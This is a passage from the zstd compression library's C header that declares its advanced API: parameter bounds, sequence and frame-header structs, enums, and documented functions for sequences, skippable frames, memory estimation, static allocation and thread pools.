#define ZSTD_BLOCKSIZE_MAX_MIN (1 << 10) /* The minimum valid max blocksize. Maximum blocksizes smaller than this make compressBound() inaccurate. */


#define ZSTD_OVERLAPLOG_MIN       0
#define ZSTD_OVERLAPLOG_MAX       9

#define ZSTD_WINDOWLOG_LIMIT_DEFAULT 27   /* by default, the streaming decoder will refuse any frame
                                           * requiring larger than (1<<ZSTD_WINDOWLOG_LIMIT_DEFAULT) window size,
                                           * to preserve host's memory from unreasonable requirements.
                                           * This limit can be overridden using ZSTD_DCtx_setParameter(,ZSTD_d_windowLogMax,).
                                           * The limit does not apply for one-pass decoders (such as ZSTD_decompress()), since no additional memory is allocated */


/* LDM parameter bounds */
#define ZSTD_LDM_HASHLOG_MIN      ZSTD_HASHLOG_MIN
#define ZSTD_LDM_HASHLOG_MAX      ZSTD_HASHLOG_MAX
#define ZSTD_LDM_MINMATCH_MIN        4
#define ZSTD_LDM_MINMATCH_MAX     4096
#define ZSTD_LDM_BUCKETSIZELOG_MIN   1
#define ZSTD_LDM_BUCKETSIZELOG_MAX   8
#define ZSTD_LDM_HASHRATELOG_MIN     0
#define ZSTD_LDM_HASHRATELOG_MAX (ZSTD_WINDOWLOG_MAX - ZSTD_HASHLOG_MIN)

/* Advanced parameter bounds */
#define ZSTD_TARGETCBLOCKSIZE_MIN   64
#define ZSTD_TARGETCBLOCKSIZE_MAX   ZSTD_BLOCKSIZE_MAX
#define ZSTD_SRCSIZEHINT_MIN        0
#define ZSTD_SRCSIZEHINT_MAX        INT_MAX


/* ---  Advanced types  --- */

typedef struct ZSTD_CCtx_params_s ZSTD_CCtx_params;

typedef struct {
    unsigned int offset;      /* The offset of the match. (NOT the same as the offset code)
                               * If offset == 0 and matchLength == 0, this sequence represents the last
                               * literals in the block of litLength size.
                               */

    unsigned int litLength;   /* Literal length of the sequence. */
    unsigned int matchLength; /* Match length of the sequence. */

                              /* Note: Users of this API may provide a sequence with matchLength == litLength == offset == 0.
                               * In this case, we will treat the sequence as a marker for a block boundary.
                               */

    unsigned int rep;         /* Represents which repeat offset is represented by the field 'offset'.
                               * Ranges from [0, 3].
                               *
                               * Repeat offsets are essentially previous offsets from previous sequences sorted in
                               * recency order. For more detail, see doc/zstd_compression_format.md
                               *
                               * If rep == 0, then 'offset' does not contain a repeat offset.
                               * If rep > 0:
                               *  If litLength != 0:
                               *      rep == 1 --> offset == repeat_offset_1
                               *      rep == 2 --> offset == repeat_offset_2
                               *      rep == 3 --> offset == repeat_offset_3
                               *  If litLength == 0:
                               *      rep == 1 --> offset == repeat_offset_2
                               *      rep == 2 --> offset == repeat_offset_3
                               *      rep == 3 --> offset == repeat_offset_1 - 1
                               *
                               * Note: This field is optional. ZSTD_generateSequences() will calculate the value of
                               * 'rep', but repeat offsets do not necessarily need to be calculated from an external
                               * sequence provider's perspective. For example, ZSTD_compressSequences() does not
                               * use this 'rep' field at all (as of now).
                               */
} ZSTD_Sequence;

typedef struct {
    unsigned windowLog;       /**< largest match distance : larger == more compression, more memory needed during decompression */
    unsigned chainLog;        /**< fully searched segment : larger == more compression, slower, more memory (useless for fast) */
    unsigned hashLog;         /**< dispatch table : larger == faster, more memory */
    unsigned searchLog;       /**< nb of searches : larger == more compression, slower */
    unsigned minMatch;        /**< match length searched : larger == faster decompression, sometimes less compression */
    unsigned targetLength;    /**< acceptable match size for optimal parser (only) : larger == more compression, slower */
    ZSTD_strategy strategy;   /**< see ZSTD_strategy definition above */
} ZSTD_compressionParameters;

typedef struct {
    int contentSizeFlag; /**< 1: content size will be in frame header (when known) */
    int checksumFlag;    /**< 1: generate a 32-bits checksum using XXH64 algorithm at end of frame, for error detection */
    int noDictIDFlag;    /**< 1: no dictID will be saved into frame header (dictID is only useful for dictionary compression) */
} ZSTD_frameParameters;

typedef struct {
    ZSTD_compressionParameters cParams;
    ZSTD_frameParameters fParams;
} ZSTD_parameters;

typedef enum {
    ZSTD_dct_auto = 0,       /* dictionary is "full" when starting with ZSTD_MAGIC_DICTIONARY, otherwise it is "rawContent" */
    ZSTD_dct_rawContent = 1, /* ensures dictionary is always loaded as rawContent, even if it starts with ZSTD_MAGIC_DICTIONARY */
    ZSTD_dct_fullDict = 2    /* refuses to load a dictionary if it does not respect Zstandard's specification, starting with ZSTD_MAGIC_DICTIONARY */
} ZSTD_dictContentType_e;

typedef enum {
    ZSTD_dlm_byCopy = 0,  /**< Copy dictionary content internally */
    ZSTD_dlm_byRef = 1    /**< Reference dictionary content -- the dictionary buffer must outlive its users. */
} ZSTD_dictLoadMethod_e;

typedef enum {
    ZSTD_f_zstd1 = 0,           /* zstd frame format, specified in zstd_compression_format.md (default) */
    ZSTD_f_zstd1_magicless = 1  /* Variant of zstd frame format, without initial 4-bytes magic number.
                                 * Useful to save 4 bytes per generated frame.
                                 * Decoder cannot recognise automatically this format, requiring this instruction. */
} ZSTD_format_e;

typedef enum {
    /* Note: this enum controls ZSTD_d_forceIgnoreChecksum */
    ZSTD_d_validateChecksum = 0,
    ZSTD_d_ignoreChecksum = 1
} ZSTD_forceIgnoreChecksum_e;

typedef enum {
    /* Note: this enum controls ZSTD_d_refMultipleDDicts */
    ZSTD_rmd_refSingleDDict = 0,
    ZSTD_rmd_refMultipleDDicts = 1
} ZSTD_refMultipleDDicts_e;

typedef enum {
    /* Note: this enum and the behavior it controls are effectively internal
     * implementation details of the compressor. They are expected to continue
     * to evolve and should be considered only in the context of extremely
     * advanced performance tuning.
     *
     * Zstd currently supports the use of a CDict in three ways:
     *
     * - The contents of the CDict can be copied into the working context. This
     *   means that the compression can search both the dictionary and input
     *   while operating on a single set of internal tables. This makes
     *   the compression faster per-byte of input. However, the initial copy of
     *   the CDict's tables incurs a fixed cost at the beginning of the
     *   compression. For small compressions (< 8 KB), that copy can dominate
     *   the cost of the compression.
     *
     * - The CDict's tables can be used in-place. In this model, compression is
     *   slower per input byte, because the compressor has to search two sets of
     *   tables. However, this model incurs no start-up cost (as long as the
     *   working context's tables can be reused). For small inputs, this can be
     *   faster than copying the CDict's tables.
     *
     * - The CDict's tables are not used at all, and instead we use the working
     *   context alone to reload the dictionary and use params based on the source
     *   size. See ZSTD_compress_insertDictionary() and ZSTD_compress_usingDict().
     *   This method is effective when the dictionary sizes are very small relative
     *   to the input size, and the input size is fairly large to begin with.
     *
     * Zstd has a simple internal heuristic that selects which strategy to use
     * at the beginning of a compression. However, if experimentation shows that
     * Zstd is making poor choices, it is possible to override that choice with
     * this enum.
     */
    ZSTD_dictDefaultAttach = 0, /* Use the default heuristic. */
    ZSTD_dictForceAttach   = 1, /* Never copy the dictionary. */
    ZSTD_dictForceCopy     = 2, /* Always copy the dictionary. */
    ZSTD_dictForceLoad     = 3  /* Always reload the dictionary */
} ZSTD_dictAttachPref_e;

typedef enum {
  ZSTD_lcm_auto = 0,          /**< Automatically determine the compression mode based on the compression level.
                               *   Negative compression levels will be uncompressed, and positive compression
                               *   levels will be compressed. */
  ZSTD_lcm_huffman = 1,       /**< Always attempt Huffman compression. Uncompressed literals will still be
                               *   emitted if Huffman compression is not profitable. */
  ZSTD_lcm_uncompressed = 2   /**< Always emit uncompressed literals. */
} ZSTD_literalCompressionMode_e;

typedef enum {
  /* Note: This enum controls features which are conditionally beneficial. Zstd typically will make a final
   * decision on whether or not to enable the feature (ZSTD_ps_auto), but setting the switch to ZSTD_ps_enable
   * or ZSTD_ps_disable allow for a force enable/disable the feature.
   */
  ZSTD_ps_auto = 0,         /* Let the library automatically determine whether the feature shall be enabled */
  ZSTD_ps_enable = 1,       /* Force-enable the feature */
  ZSTD_ps_disable = 2       /* Do not use the feature */
} ZSTD_paramSwitch_e;

/***************************************
*  Frame header and size functions
***************************************/

/*! ZSTD_findDecompressedSize() :
 *  `src` should point to the start of a series of ZSTD encoded and/or skippable frames
 *  `srcSize` must be the _exact_ size of this series
 *       (i.e. there should be a frame boundary at `src + srcSize`)
 *  @return : - decompressed size of all data in all successive frames
 *            - if the decompressed size cannot be determined: ZSTD_CONTENTSIZE_UNKNOWN
 *            - if an error occurred: ZSTD_CONTENTSIZE_ERROR
 *
 *   note 1 : decompressed size is an optional field, that may not be present, especially in streaming mode.
 *            When `return==ZSTD_CONTENTSIZE_UNKNOWN`, data to decompress could be any size.
 *            In which case, it's necessary to use streaming mode to decompress data.
 *   note 2 : decompressed size is always present when compression is done with ZSTD_compress()
 *   note 3 : decompressed size can be very large (64-bits value),
 *            potentially larger than what local system can handle as a single memory segment.
 *            In which case, it's necessary to use streaming mode to decompress data.
 *   note 4 : If source is untrusted, decompressed size could be wrong or intentionally modified.
 *            Always ensure result fits within application's authorized limits.
 *            Each application can set its own limits.
 *   note 5 : ZSTD_findDecompressedSize handles multiple frames, and so it must traverse the input to
 *            read each contained frame header.  This is fast as most of the data is skipped,
 *            however it does mean that all frame data must be present and valid. */
ZSTDLIB_STATIC_API unsigned long long ZSTD_findDecompressedSize(const void* src, size_t srcSize);

/*! ZSTD_decompressBound() :
 *  `src` should point to the start of a series of ZSTD encoded and/or skippable frames
 *  `srcSize` must be the _exact_ size of this series
 *       (i.e. there should be a frame boundary at `src + srcSize`)
 *  @return : - upper-bound for the decompressed size of all data in all successive frames
 *            - if an error occurred: ZSTD_CONTENTSIZE_ERROR
 *
 *  note 1  : an error can occur if `src` contains an invalid or incorrectly formatted frame.
 *  note 2  : the upper-bound is exact when the decompressed size field is available in every ZSTD encoded frame of `src`.
 *            in this case, `ZSTD_findDecompressedSize` and `ZSTD_decompressBound` return the same value.
 *  note 3  : when the decompressed size field isn't available, the upper-bound for that frame is calculated by:
 *              upper-bound = # blocks * min(128 KB, Window_Size)
 */
ZSTDLIB_STATIC_API unsigned long long ZSTD_decompressBound(const void* src, size_t srcSize);

/*! ZSTD_frameHeaderSize() :
 *  srcSize must be >= ZSTD_FRAMEHEADERSIZE_PREFIX.
 * @return : size of the Frame Header,
 *           or an error code (if srcSize is too small) */
ZSTDLIB_STATIC_API size_t ZSTD_frameHeaderSize(const void* src, size_t srcSize);

typedef enum { ZSTD_frame, ZSTD_skippableFrame } ZSTD_frameType_e;
typedef struct {
    unsigned long long frameContentSize; /* if == ZSTD_CONTENTSIZE_UNKNOWN, it means this field is not available. 0 means "empty" */
    unsigned long long windowSize;       /* can be very large, up to <= frameContentSize */
    unsigned blockSizeMax;
    ZSTD_frameType_e frameType;          /* if == ZSTD_skippableFrame, frameContentSize is the size of skippable content */
    unsigned headerSize;
    unsigned dictID;
    unsigned checksumFlag;
    unsigned _reserved1;
    unsigned _reserved2;
} ZSTD_frameHeader;

/*! ZSTD_getFrameHeader() :
 *  decode Frame Header, or requires larger `srcSize`.
 * @return : 0, `zfhPtr` is correctly filled,
 *          >0, `srcSize` is too small, value is wanted `srcSize` amount,
 *           or an error code, which can be tested using ZSTD_isError() */
ZSTDLIB_STATIC_API size_t ZSTD_getFrameHeader(ZSTD_frameHeader* zfhPtr, const void* src, size_t srcSize);   /**< doesn't consume input */
/*! ZSTD_getFrameHeader_advanced() :
 *  same as ZSTD_getFrameHeader(),
 *  with added capability to select a format (like ZSTD_f_zstd1_magicless) */
ZSTDLIB_STATIC_API size_t ZSTD_getFrameHeader_advanced(ZSTD_frameHeader* zfhPtr, const void* src, size_t srcSize, ZSTD_format_e format);

/*! ZSTD_decompressionMargin() :
 * Zstd supports in-place decompression, where the input and output buffers overlap.
 * In this case, the output buffer must be at least (Margin + Output_Size) bytes large,
 * and the input buffer must be at the end of the output buffer.
 *
 *  _______________________ Output Buffer ________________________
 * |                                                              |
 * |                                        ____ Input Buffer ____|
 * |                                       |                      |
 * v                                       v                      v
 * |---------------------------------------|-----------|----------|
 * ^                                                   ^          ^
 * |___________________ Output_Size ___________________|_ Margin _|
 *
 * NOTE: See also ZSTD_DECOMPRESSION_MARGIN().
 * NOTE: This applies only to single-pass decompression through ZSTD_decompress() or
 * ZSTD_decompressDCtx().
 * NOTE: This function supports multi-frame input.
 *
 * @param src The compressed frame(s)
 * @param srcSize The size of the compressed frame(s)
 * @returns The decompression margin or an error that can be checked with ZSTD_isError().
 */
ZSTDLIB_STATIC_API size_t ZSTD_decompressionMargin(const void* src, size_t srcSize);

/*! ZSTD_DECOMPRESS_MARGIN() :
 * Similar to ZSTD_decompressionMargin(), but instead of computing the margin from
 * the compressed frame, compute it from the original size and the blockSizeLog.
 * See ZSTD_decompressionMargin() for details.
 *
 * WARNING: This macro does not support multi-frame input, the input must be a single
 * zstd frame. If you need that support use the function, or implement it yourself.
 *
 * @param originalSize The original uncompressed size of the data.
 * @param blockSize    The block size == MIN(windowSize, ZSTD_BLOCKSIZE_MAX).
 *                     Unless you explicitly set the windowLog smaller than
 *                     ZSTD_BLOCKSIZELOG_MAX you can just use ZSTD_BLOCKSIZE_MAX.
 */
#define ZSTD_DECOMPRESSION_MARGIN(originalSize, blockSize) ((size_t)(                                              \
        ZSTD_FRAMEHEADERSIZE_MAX                                                              /* Frame header */ + \
        4                                                                                         /* checksum */ + \
        ((originalSize) == 0 ? 0 : 3 * (((originalSize) + (blockSize) - 1) / blockSize)) /* 3 bytes per block */ + \
        (blockSize)                                                                    /* One block of margin */   \
    ))

typedef enum {
  ZSTD_sf_noBlockDelimiters = 0,         /* Representation of ZSTD_Sequence has no block delimiters, sequences only */
  ZSTD_sf_explicitBlockDelimiters = 1    /* Representation of ZSTD_Sequence contains explicit block delimiters */
} ZSTD_sequenceFormat_e;

/*! ZSTD_sequenceBound() :
 * `srcSize` : size of the input buffer
 *  @return : upper-bound for the number of sequences that can be generated
 *            from a buffer of srcSize bytes
 *
 *  note : returns number of sequences - to get bytes, multiply by sizeof(ZSTD_Sequence).
 */
ZSTDLIB_STATIC_API size_t ZSTD_sequenceBound(size_t srcSize);

/*! ZSTD_generateSequences() :
 * Generate sequences using ZSTD_compress2(), given a source buffer.
 *
 * Each block will end with a dummy sequence
 * with offset == 0, matchLength == 0, and litLength == length of last literals.
 * litLength may be == 0, and if so, then the sequence of (of: 0 ml: 0 ll: 0)
 * simply acts as a block delimiter.
 *
 * @zc can be used to insert custom compression params.
 * This function invokes ZSTD_compress2().
 *
 * The output of this function can be fed into ZSTD_compressSequences() with CCtx
 * setting of ZSTD_c_blockDelimiters as ZSTD_sf_explicitBlockDelimiters
 * @return : number of sequences generated
 */

ZSTDLIB_STATIC_API size_t
ZSTD_generateSequences( ZSTD_CCtx* zc,
                        ZSTD_Sequence* outSeqs, size_t outSeqsSize,
                        const void* src, size_t srcSize);

/*! ZSTD_mergeBlockDelimiters() :
 * Given an array of ZSTD_Sequence, remove all sequences that represent block delimiters/last literals
 * by merging them into the literals of the next sequence.
 *
 * As such, the final generated result has no explicit representation of block boundaries,
 * and the final last literals segment is not represented in the sequences.
 *
 * The output of this function can be fed into ZSTD_compressSequences() with CCtx
 * setting of ZSTD_c_blockDelimiters as ZSTD_sf_noBlockDelimiters
 * @return : number of sequences left after merging
 */
ZSTDLIB_STATIC_API size_t ZSTD_mergeBlockDelimiters(ZSTD_Sequence* sequences, size_t seqsSize);

/*! ZSTD_compressSequences() :
 * Compress an array of ZSTD_Sequence, associated with @src buffer, into dst.
 * @src contains the entire input (not just the literals).
 * If @srcSize > sum(sequence.length), the remaining bytes are considered all literals
 * If a dictionary is included, then the cctx should reference the dict. (see: ZSTD_CCtx_refCDict(), ZSTD_CCtx_loadDictionary(), etc.)
 * The entire source is compressed into a single frame.
 *
 * The compression behavior changes based on cctx params. In particular:
 *    If ZSTD_c_blockDelimiters == ZSTD_sf_noBlockDelimiters, the array of ZSTD_Sequence is expected to contain
 *    no block delimiters (defined in ZSTD_Sequence). Block boundaries are roughly determined based on
 *    the block size derived from the cctx, and sequences may be split. This is the default setting.
 *
 *    If ZSTD_c_blockDelimiters == ZSTD_sf_explicitBlockDelimiters, the array of ZSTD_Sequence is expected to contain
 *    block delimiters (defined in ZSTD_Sequence). Behavior is undefined if no block delimiters are provided.
 *
 *    If ZSTD_c_validateSequences == 0, this function will blindly accept the sequences provided. Invalid sequences cause undefined
 *    behavior. If ZSTD_c_validateSequences == 1, then if sequence is invalid (see doc/zstd_compression_format.md for
 *    specifics regarding offset/matchlength requirements) then the function will bail out and return an error.
 *
 *    In addition to the two adjustable experimental params, there are other important cctx params.
 *    - ZSTD_c_minMatch MUST be set as less than or equal to the smallest match generated by the match finder. It has a minimum value of ZSTD_MINMATCH_MIN.
 *    - ZSTD_c_compressionLevel accordingly adjusts the strength of the entropy coder, as it would in typical compression.
 *    - ZSTD_c_windowLog affects offset validation: this function will return an error at higher debug levels if a provided offset
 *      is larger than what the spec allows for a given window log and dictionary (if present). See: doc/zstd_compression_format.md
 *
 * Note: Repcodes are, as of now, always re-calculated within this function, so ZSTD_Sequence::rep is unused.
 * Note 2: Once we integrate ability to ingest repcodes, the explicit block delims mode must respect those repcodes exactly,
 *         and cannot emit an RLE block that disagrees with the repcode history
 * @return : final compressed size, or a ZSTD error code.
 */
ZSTDLIB_STATIC_API size_t
ZSTD_compressSequences( ZSTD_CCtx* cctx, void* dst, size_t dstSize,
                        const ZSTD_Sequence* inSeqs, size_t inSeqsSize,
                        const void* src, size_t srcSize);


/*! ZSTD_writeSkippableFrame() :
 * Generates a zstd skippable frame containing data given by src, and writes it to dst buffer.
 *
 * Skippable frames begin with a 4-byte magic number. There are 16 possible choices of magic number,
 * ranging from ZSTD_MAGIC_SKIPPABLE_START to ZSTD_MAGIC_SKIPPABLE_START+15.
 * As such, the parameter magicVariant controls the exact skippable frame magic number variant used, so
 * the magic number used will be ZSTD_MAGIC_SKIPPABLE_START + magicVariant.
 *
 * Returns an error if destination buffer is not large enough, if the source size is not representable
 * with a 4-byte unsigned int, or if the parameter magicVariant is greater than 15 (and therefore invalid).
 *
 * @return : number of bytes written or a ZSTD error.
 */
ZSTDLIB_STATIC_API size_t ZSTD_writeSkippableFrame(void* dst, size_t dstCapacity,
                                            const void* src, size_t srcSize, unsigned magicVariant);

/*! ZSTD_readSkippableFrame() :
 * Retrieves a zstd skippable frame containing data given by src, and writes it to dst buffer.
 *
 * The parameter magicVariant will receive the magicVariant that was supplied when the frame was written,
 * i.e. magicNumber - ZSTD_MAGIC_SKIPPABLE_START.  This can be NULL if the caller is not interested
 * in the magicVariant.
 *
 * Returns an error if destination buffer is not large enough, or if the frame is not skippable.
 *
 * @return : number of bytes written or a ZSTD error.
 */
ZSTDLIB_API size_t ZSTD_readSkippableFrame(void* dst, size_t dstCapacity, unsigned* magicVariant,
                                            const void* src, size_t srcSize);

/*! ZSTD_isSkippableFrame() :
 *  Tells if the content of `buffer` starts with a valid Frame Identifier for a skippable frame.
 */
ZSTDLIB_API unsigned ZSTD_isSkippableFrame(const void* buffer, size_t size);



/***************************************
*  Memory management
***************************************/

/*! ZSTD_estimate*() :
 *  These functions make it possible to estimate memory usage
 *  of a future {D,C}Ctx, before its creation.
 *
 *  ZSTD_estimateCCtxSize() will provide a memory budget large enough
 *  for any compression level up to selected one.
 *  Note : Unlike ZSTD_estimateCStreamSize*(), this estimate
 *         does not include space for a window buffer.
 *         Therefore, the estimation is only guaranteed for single-shot compressions, not streaming.
 *  The estimate will assume the input may be arbitrarily large,
 *  which is the worst case.
 *
 *  When srcSize can be bound by a known and rather "small" value,
 *  this fact can be used to provide a tighter estimation
 *  because the CCtx compression context will need less memory.
 *  This tighter estimation can be provided by more advanced functions
 *  ZSTD_estimateCCtxSize_usingCParams(), which can be used in tandem with ZSTD_getCParams(),
 *  and ZSTD_estimateCCtxSize_usingCCtxParams(), which can be used in tandem with ZSTD_CCtxParams_setParameter().
 *  Both can be used to estimate memory using custom compression parameters and arbitrary srcSize limits.
 *
 *  Note : only single-threaded compression is supported.
 *  ZSTD_estimateCCtxSize_usingCCtxParams() will return an error code if ZSTD_c_nbWorkers is >= 1.
 *
 *  Note 2 : ZSTD_estimateCCtxSize* functions are not compatible with the Block-Level Sequence Producer API at this time.
 *  Size estimates assume that no external sequence producer is registered.
 */
ZSTDLIB_STATIC_API size_t ZSTD_estimateCCtxSize(int compressionLevel);
ZSTDLIB_STATIC_API size_t ZSTD_estimateCCtxSize_usingCParams(ZSTD_compressionParameters cParams);
ZSTDLIB_STATIC_API size_t ZSTD_estimateCCtxSize_usingCCtxParams(const ZSTD_CCtx_params* params);
ZSTDLIB_STATIC_API size_t ZSTD_estimateDCtxSize(void);

/*! ZSTD_estimateCStreamSize() :
 *  ZSTD_estimateCStreamSize() will provide a budget large enough for any compression level up to selected one.
 *  It will also consider src size to be arbitrarily "large", which is worst case.
 *  If srcSize is known to always be small, ZSTD_estimateCStreamSize_usingCParams() can provide a tighter estimation.
 *  ZSTD_estimateCStreamSize_usingCParams() can be used in tandem with ZSTD_getCParams() to create cParams from compressionLevel.
 *  ZSTD_estimateCStreamSize_usingCCtxParams() can be used in tandem with ZSTD_CCtxParams_setParameter(). Only single-threaded compression is supported. This function will return an error code if ZSTD_c_nbWorkers is >= 1.
 *  Note : CStream size estimation is only correct for single-threaded compression.
 *  ZSTD_DStream memory budget depends on window Size.
 *  This information can be passed manually, using ZSTD_estimateDStreamSize,
 *  or deducted from a valid frame Header, using ZSTD_estimateDStreamSize_fromFrame();
 *  Note : if streaming is init with function ZSTD_init?Stream_usingDict(),
 *         an internal ?Dict will be created, which additional size is not estimated here.
 *         In this case, get total size by adding ZSTD_estimate?DictSize
 *  Note 2 : only single-threaded compression is supported.
 *  ZSTD_estimateCStreamSize_usingCCtxParams() will return an error code if ZSTD_c_nbWorkers is >= 1.
 *  Note 3 : ZSTD_estimateCStreamSize* functions are not compatible with the Block-Level Sequence Producer API at this time.
 *  Size estimates assume that no external sequence producer is registered.
 */
ZSTDLIB_STATIC_API size_t ZSTD_estimateCStreamSize(int compressionLevel);
ZSTDLIB_STATIC_API size_t ZSTD_estimateCStreamSize_usingCParams(ZSTD_compressionParameters cParams);
ZSTDLIB_STATIC_API size_t ZSTD_estimateCStreamSize_usingCCtxParams(const ZSTD_CCtx_params* params);
ZSTDLIB_STATIC_API size_t ZSTD_estimateDStreamSize(size_t windowSize);
ZSTDLIB_STATIC_API size_t ZSTD_estimateDStreamSize_fromFrame(const void* src, size_t srcSize);

/*! ZSTD_estimate?DictSize() :
 *  ZSTD_estimateCDictSize() will bet that src size is relatively "small", and content is copied, like ZSTD_createCDict().
 *  ZSTD_estimateCDictSize_advanced() makes it possible to control compression parameters precisely, like ZSTD_createCDict_advanced().
 *  Note : dictionaries created by reference (`ZSTD_dlm_byRef`) are logically smaller.
 */
ZSTDLIB_STATIC_API size_t ZSTD_estimateCDictSize(size_t dictSize, int compressionLevel);
ZSTDLIB_STATIC_API size_t ZSTD_estimateCDictSize_advanced(size_t dictSize, ZSTD_compressionParameters cParams, ZSTD_dictLoadMethod_e dictLoadMethod);
ZSTDLIB_STATIC_API size_t ZSTD_estimateDDictSize(size_t dictSize, ZSTD_dictLoadMethod_e dictLoadMethod);

/*! ZSTD_initStatic*() :
 *  Initialize an object using a pre-allocated fixed-size buffer.
 *  workspace: The memory area to emplace the object into.
 *             Provided pointer *must be 8-bytes aligned*.
 *             Buffer must outlive object.
 *  workspaceSize: Use ZSTD_estimate*Size() to determine
 *                 how large workspace must be to support target scenario.
 * @return : pointer to object (same address as workspace, just different type),
 *           or NULL if error (size too small, incorrect alignment, etc.)
 *  Note : zstd will never resize nor malloc() when using a static buffer.
 *         If the object requires more memory than available,
 *         zstd will just error out (typically ZSTD_error_memory_allocation).
 *  Note 2 : there is no corresponding "free" function.
 *           Since workspace is allocated externally, it must be freed externally too.
 *  Note 3 : cParams : use ZSTD_getCParams() to convert a compression level
 *           into its associated cParams.
 *  Limitation 1 : currently not compatible with internal dictionary creation, triggered by
 *                 ZSTD_CCtx_loadDictionary(), ZSTD_initCStream_usingDict() or ZSTD_initDStream_usingDict().
 *  Limitation 2 : static cctx currently not compatible with multi-threading.
 *  Limitation 3 : static dctx is incompatible with legacy support.
 */
ZSTDLIB_STATIC_API ZSTD_CCtx*    ZSTD_initStaticCCtx(void* workspace, size_t workspaceSize);
ZSTDLIB_STATIC_API ZSTD_CStream* ZSTD_initStaticCStream(void* workspace, size_t workspaceSize);    /**< same as ZSTD_initStaticCCtx() */

ZSTDLIB_STATIC_API ZSTD_DCtx*    ZSTD_initStaticDCtx(void* workspace, size_t workspaceSize);
ZSTDLIB_STATIC_API ZSTD_DStream* ZSTD_initStaticDStream(void* workspace, size_t workspaceSize);    /**< same as ZSTD_initStaticDCtx() */

ZSTDLIB_STATIC_API const ZSTD_CDict* ZSTD_initStaticCDict(
                                        void* workspace, size_t workspaceSize,
                                        const void* dict, size_t dictSize,
                                        ZSTD_dictLoadMethod_e dictLoadMethod,
                                        ZSTD_dictContentType_e dictContentType,
                                        ZSTD_compressionParameters cParams);

ZSTDLIB_STATIC_API const ZSTD_DDict* ZSTD_initStaticDDict(
                                        void* workspace, size_t workspaceSize,
                                        const void* dict, size_t dictSize,
                                        ZSTD_dictLoadMethod_e dictLoadMethod,
                                        ZSTD_dictContentType_e dictContentType);


/*! Custom memory allocation :
 *  These prototypes make it possible to pass your own allocation/free functions.
 *  ZSTD_customMem is provided at creation time, using ZSTD_create*_advanced() variants listed below.
 *  All allocation/free operations will be completed using these custom variants instead of regular <stdlib.h> ones.
 */
typedef void* (*ZSTD_allocFunction) (void* opaque, size_t size);
typedef void  (*ZSTD_freeFunction) (void* opaque, void* address);
typedef struct { ZSTD_allocFunction customAlloc; ZSTD_freeFunction customFree; void* opaque; } ZSTD_customMem;
static
#ifdef __GNUC__
__attribute__((__unused__))
#endif
ZSTD_customMem const ZSTD_defaultCMem = { NULL, NULL, NULL };  /**< this constant defers to stdlib's functions */

ZSTDLIB_STATIC_API ZSTD_CCtx*    ZSTD_createCCtx_advanced(ZSTD_customMem customMem);
ZSTDLIB_STATIC_API ZSTD_CStream* ZSTD_createCStream_advanced(ZSTD_customMem customMem);
ZSTDLIB_STATIC_API ZSTD_DCtx*    ZSTD_createDCtx_advanced(ZSTD_customMem customMem);
ZSTDLIB_STATIC_API ZSTD_DStream* ZSTD_createDStream_advanced(ZSTD_customMem customMem);

ZSTDLIB_STATIC_API ZSTD_CDict* ZSTD_createCDict_advanced(const void* dict, size_t dictSize,
                                                  ZSTD_dictLoadMethod_e dictLoadMethod,
                                                  ZSTD_dictContentType_e dictContentType,
                                                  ZSTD_compressionParameters cParams,
                                                  ZSTD_customMem customMem);

/*! Thread pool :
 *  These prototypes make it possible to share a thread pool among multiple compression contexts.
 *  This can limit resources for applications with multiple threads where each one uses
 *  a threaded compression mode (via ZSTD_c_nbWorkers parameter).
 *  ZSTD_createThreadPool creates a new thread pool with a given number of threads.
 *  Note that the lifetime of such pool must exist while being used.
 *  ZSTD_CCtx_refThreadPool assigns a thread pool to a context (use NULL argument value
 *  to use an internal thread pool).
 *  ZSTD_freeThreadPool frees a thread pool, accepts NULL pointer.
 */
typedef struct POOL_ctx_s ZSTD_threadPool;
ZSTDLIB_STATIC_API ZSTD_threadPool* ZSTD_createThreadPool(size_t numThreads);
ZSTDLIB_STATIC_API void ZSTD_freeThreadPool (ZSTD_threadPool* pool);  /* accept NULL pointer */
ZSTDLIB_STATIC_API size_t ZSTD_CCtx_refThreadPool(ZSTD_CCtx* cctx, ZSTD_threadPool* pool);


/*
 * This API is temporary and is expected to change or disappear in the future!
 */
ZSTDLIB_STATIC_API ZSTD_CDict* ZSTD_createCDict_advanced2(
    const void* dict, size_t dictSize,
    ZSTD_dictLoadMethod_e dictLoadMethod,
    ZSTD_dictContentType_e dictContentType,
    const ZSTD_CCtx_params* cctxParams,
    ZSTD_customMem customMem);

ZSTDLIB_STATIC_API ZSTD_DDict* ZSTD_createDDict_advanced(
    const void* dict, size_t dictSize,
    ZSTD_dictLoadMethod_e dictLoadMethod,
    ZSTD_dictContentType_e dictContentType,
    ZSTD_customMem customMem);


/***************************************
*  Advanced compression functions
***************************************/

/*! ZSTD_createCDict_byReference() :
 *  Create a digested dictionary for compression
 *  Dictionary content is just referenced, not duplicated.
 *  As a consequence, `dictBuffer` **must** outlive CDict,
 *  and its content must remain unmodified throughout the lifetime of CDict.
 *  note: equivalent to ZSTD_createCDict_advanced(), with dictLoadMethod==ZSTD_dlm_byRef */
ZSTDLIB_STATIC_API ZSTD_CDict* ZSTD_createCDict_byReference(const void* dictBuffer, size_t dictSize, int compressionLevel);

/*! ZSTD_getCParams() :
 * @return ZSTD_compressionParameters structure for a selected compression level and estimated srcSize.
 * `estimatedSrcSize` value is optional, select 0 if not known */
ZSTDLIB_STATIC_API ZSTD_compressionParameters ZSTD_getCParams(int compressionLevel, unsigned long long estimatedSrcSize, size_t dictSize);

/*! ZSTD_getParams() :
 *  same as ZSTD_getCParams(), but @return a full `ZSTD_parameters` object instead of sub-component `ZSTD_compressionParameters`.
 *  All fields of `ZSTD_frameParameters` are set to default : contentSize=1, checksum=0, noDictID=0 */
ZSTDLIB_STATIC_API ZSTD_parameters ZSTD_getParams(int compressionLevel, unsigned long long estimatedSrcSize, size_t dictSize);

/*! ZSTD_checkCParams() :
 *  Ensure param values remain within authorized range.
 * @return 0 on success, or an error code (can be checked with ZSTD_isError()) */
ZSTDLIB_STATIC_API size_t ZSTD_checkCParams(ZSTD_compressionParameters params);

/*! ZSTD_adjustCParams() :
 *  optimize params for a given `srcSize` and `dictSize`.
 * `srcSize` can be unknown, in which case use ZSTD_CONTENTSIZE_UNKNOWN.
 * `dictSize` must be `0` when there is no dictionary.
 *  cPar can be invalid : all parameters will be clamped within valid range in the @return struct.
 *  This function never fails (wide contract) */
ZSTDLIB_STATIC_API ZSTD_compressionParameters ZSTD_adjustCParams(ZSTD_compressionParameters cPar, unsigned long long srcSize, size_t dictSize);

/*! ZSTD_CCtx_setCParams() :
